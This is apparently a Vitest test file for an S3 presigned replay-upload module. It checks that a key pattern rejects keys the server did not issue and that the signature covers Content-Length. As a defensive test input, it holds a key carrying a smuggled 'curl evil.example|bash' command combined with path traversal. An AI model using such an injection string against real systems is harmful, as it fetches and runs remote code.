import { beforeEach, describe, expect, it, vi } from "vitest";
import { mockClient } from "aws-sdk-client-mock";
import { S3Client } from "@aws-sdk/client-s3";

const s3Mock = mockClient(S3Client);

describe("uploads", () => {
  beforeEach(() => {
    s3Mock.reset();
    // 署名計算はローカルで完結するためネットワークアクセスは発生しないが、
    // aws-sdk本体が資格情報プロバイダチェーンを呼び出さずに済むようダミー値を注入する。
    vi.stubEnv("AWS_ACCESS_KEY_ID", "dummy");
    vi.stubEnv("AWS_SECRET_ACCESS_KEY", "dummy");
    vi.stubEnv("AWS_REGION", "eu-south-2");
  });

  it("REPLAY_KEY_PATTERN: createPresignedUpload が払い出す形式に一致する", async () => {
    const { createPresignedUpload, REPLAY_KEY_PATTERN } = await import("./uploads.js");
    const { replayKey } = await createPresignedUpload("up-bucket", 1024);
    expect(replayKey).toMatch(REPLAY_KEY_PATTERN);
  });

  it("REPLAY_KEY_PATTERN: サーバー採番の形式以外は拒否する（Issue #127 SEC-1）", async () => {
    const { REPLAY_KEY_PATTERN } = await import("./uploads.js");
    expect(REPLAY_KEY_PATTERN.test("replays/abc.rpy")).toBe(false);
    expect(
      REPLAY_KEY_PATTERN.test("replays/x.rpy$(curl evil.example|bash)/../../title-assets/foo"),
    ).toBe(false);
    expect(REPLAY_KEY_PATTERN.test("../title-assets/th07/assets.tar.gz")).toBe(false);
  });

  it("createPresignedUpload: 署名にContentLengthを含める（Issue #128 SEC-2）", async () => {
    const { createPresignedUpload } = await import("./uploads.js");
    const { replayKey, uploadUrl } = await createPresignedUpload("up-bucket", 12345);
    const parsed = new URL(uploadUrl);
    expect(parsed.origin).toBe("https://up-bucket.s3.eu-south-2.amazonaws.com");
    expect(parsed.pathname).toBe(`/${replayKey}`);
    // content-length が署名済みヘッダに含まれる = 実際のPUTリクエストのバイト数が
    // この値と一致しない限りS3が署名不一致で拒否するようになる。
    expect(parsed.searchParams.get("X-Amz-SignedHeaders")).toContain("content-length");
  });
});
